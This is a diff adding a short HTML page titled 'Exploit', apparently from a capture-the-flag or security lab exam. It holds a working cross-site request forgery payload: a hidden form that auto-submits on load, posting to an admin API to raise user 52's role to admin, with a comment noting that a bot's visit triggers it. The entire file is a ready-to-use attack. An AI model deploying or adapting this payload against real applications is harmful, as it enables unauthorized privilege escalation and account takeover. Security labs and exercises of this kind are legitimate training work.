@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exploit</title></head>
+<body>
+  <form id="csrfForm" action="https://ipkage.exam.cyberjutsu-lab.tech/api/admin/users/52/role" method="POST" enctype="text/plain">
+    <input type="hidden" name="role" value="admin">
+  </form>
+  <script>
+    // Auto-submit ngay khi load (bot visit = trigger)
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
